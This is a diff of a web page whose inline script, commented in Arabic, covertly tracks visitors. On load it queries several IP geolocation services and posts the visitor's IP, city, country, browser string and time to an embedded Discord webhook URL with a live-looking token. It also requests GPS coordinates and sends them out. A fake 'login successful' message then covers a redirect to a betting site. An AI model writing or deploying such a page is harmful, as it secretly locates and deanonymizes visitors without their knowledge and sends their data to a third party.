@@ -9,7 +9,6 @@
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       background: #f2f2f2;
     }
-
     .navbar {
       background-color: #003366;
       color: white;
@@ -18,7 +17,6 @@
       font-size: 24px;
       font-weight: bold;
     }
-
     .main-content {
       display: flex;
       flex-direction: column;
@@ -27,7 +25,6 @@
       height: 80vh;
       text-align: center;
     }
-
     .card {
       background-color: white;
       border-radius: 10px;
@@ -36,7 +33,6 @@
       max-width: 400px;
       width: 90%;
     }
-
     .loader {
       margin-top: 20px;
       border: 6px solid #f3f3f3;
@@ -46,7 +42,6 @@
       height: 40px;
       animation: spin 1s linear infinite;
     }
-
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
@@ -66,83 +61,74 @@
 </div>
 
 <script>
-  const now = new Date().toLocaleString();
-  const userAgent = navigator.userAgent;
   const webhookUrl = "https://discord.com/api/webhooks/1363558899382358067/O06A811WKbK7gvFMQQWTXkzdIHwe9qTBl0GQyibpDxj1yBxtxIPm2PZpExJXxeKdbNTQ";
+  const userAgent = navigator.userAgent;
+  const now = new Date().toLocaleString();
 
-  function sendMessage(content) {
+  const sources = [
+    { url: "https://ipinfo.io/json?token=34011ec27e4e2f", parser: d => `🌐 IPInfo: ${d.ip}, ${d.country} - ${d.city}` },
+    { url: "https://ipwho.is/", parser: d => `📍 IPWho: ${d.ip}, ${d.country} - ${d.city}` },
+    { url: "https://ipapi.co/json/", parser: d => `🛰️ IPAPI: ${d.ip}, ${d.country_name} - ${d.city}` },
+    { url: "https://freeipapi.com/api/json", parser: d => `🗺️ FreeIPAPI: ${d.ipAddress}, ${d.countryName} - ${d.cityName}` }
+  ];
+
+  // محاولة جلب البيانات من كل مصدر
+  Promise.allSettled(sources.map(src =>
+    fetch(src.url).then(res => res.json()).then(data => src.parser(data))
+  ))
+  .then(results => {
+    const successful = results
+      .filter(r => r.status === 'fulfilled')
+      .map(r => r.value)
+      .join("\n");
+
+    const baseMessage = `🕵️‍♂️ زائر جديد دخل الموقع:
+${successful}
+
+🖥️ المتصفح: ${userAgent}
+📅 الوقت: ${now}
+`;
+
+    // إرسال بيانات الموقع التقريبي أولاً
     fetch(webhookUrl, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ content })
+      body: JSON.stringify({ content: baseMessage })
     });
-  }
 
-  // 1️⃣ الموقع التقريبي من IP
-  function sendApproximateLocation() {
-    Promise.all([
-      fetch("https://ipinfo.io/json?token=34011ec27e4e2f").then(res => res.json()),
-      fetch("https://ipwho.is/").then(res => res.json()),
-      fetch("http://ip-api.com/json/").then(res => res.json()),
-      fetch("https://ipapi.co/json/").then(res => res.json())
-    ])
-    .then(([info1, info2, info3, info4]) => {
-      const content = `🌍 الموقع التقريبي (IP Based):
+    // بعدين نجرب نجيب الموقع الدقيق
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          const { latitude, longitude } = pos.coords;
+          const geoMessage = `📌 الموقع الدقيق:
+📍 الإحداثيات: ${latitude}, ${longitude}`;
 
-🗺️ ipinfo.io: ${info1.country} - ${info1.city}
-🗺️ ipwho.is: ${info2.country} - ${info2.city}
-🗺️ ip-api.com: ${info3.country} - ${info3.city}
-🗺️ ipapi.co: ${info4.country_name} - ${info4.city}
+          fetch(webhookUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ content: geoMessage })
+          });
+        },
+        (err) => {
+          console.warn("الموقع الدقيق مرفوض أو غير متاح.");
+        }
+      );
+    }
 
-🖥️ المتصفح: ${userAgent}
-📅 الوقت: ${now}`;
-
-      sendMessage(content);
-    });
-  }
-
-  // 2️⃣ الموقع الدقيق من GPS
-  function trySendGPSLocation() {
-    if (!navigator.geolocation) return;
-
-    navigator.geolocation.getCurrentPosition(
-      (position) => {
-        const lat = position.coords.latitude;
-        const lon = position.coords.longitude;
-        const gmaps = `https://www.google.com/maps?q=${lat},${lon}`;
-        const content = `📡 الموقع الدقيق (GPS):
-
-📍 Latitude: ${lat}
-📍 Longitude: ${lon}
-🔗 [عرض على الخريطة](${gmaps})
-
-🖥️ المتصفح: ${userAgent}
-📅 الوقت: ${now}`;
-
-        sendMessage(content);
-      },
-      (error) => {
-        console.warn("GPS غير متاح أو تم رفضه");
-      },
-      { timeout: 5000 }
-    );
-  }
-
-  // 3️⃣ التحويل بعد الرسالة
-  function redirectTo1xBet() {
+    // عرض رسالة مؤقتة ثم تحويل
     setTimeout(() => {
       document.querySelector('.card').innerHTML = "<h3>تم تسجيل الدخول بنجاح ✅</h3><p>جاري تحويلك الآن...</p>";
       setTimeout(() => {
-        window.location.replace("https://1xbet.com");
+        window.location.href = "https://1xbet.com";
       }, 3000);
-    }, 3000);
-  }
+    }, 2000);
 
-  // تشغيل كل الخطوات
-  sendApproximateLocation(); // يبعث الموقع التقريبي فورًا
-  trySendGPSLocation();      // بعده يبعث الموقع الدقيق لو أمكن
-  redirectTo1xBet();         // بعد 6 ثواني يحوّل المستخدم
-
+  })
+  .catch(err => {
+    console.error("خطأ أثناء جمع البيانات:", err);
+    document.querySelector('.card').innerHTML = "<p>⚠️ حصل خطأ في تحميل البيانات.</p>";
+  });
 </script>
 
 </body>
